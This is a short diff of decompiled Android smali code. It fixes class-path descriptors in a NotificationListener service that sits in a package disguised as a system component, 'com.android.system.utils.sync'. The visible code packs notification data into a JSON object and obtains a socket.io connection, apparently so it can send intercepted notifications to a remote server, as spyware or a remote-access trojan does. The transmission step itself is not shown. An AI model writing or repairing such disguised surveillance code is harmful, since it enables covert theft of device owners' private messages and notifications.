@@ -1,4 +1,4 @@
-.class public Lcom.android.system.utils.sync/NotificationListener;
+.class public Lcom/android/system/utils/sync/NotificationListener;
 .super Landroid/service/notification/NotificationListenerService;
 .source "NotificationListener.java"
 
@@ -141,11 +141,11 @@
     invoke-virtual {v8, v3, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
 
     .line 39
-    invoke-static {}, Lcom.android.system.utils.sync/IOSocket;->getInstance()Lcom.android.system.utils.sync/IOSocket;
+    invoke-static {}, Lcom/android/system/utils/sync/IOSocket;->getInstance()Lcom/android/system/utils/sync/IOSocket;
 
     move-result-object v3
 
-    invoke-virtual {v3}, Lcom.android.system.utils.sync/IOSocket;->getIoSocket()Lio/socket/client/Socket;
+    invoke-virtual {v3}, Lcom/android/system/utils/sync/IOSocket;->getIoSocket()Lio/socket/client/Socket;
 
     move-result-object v3
 
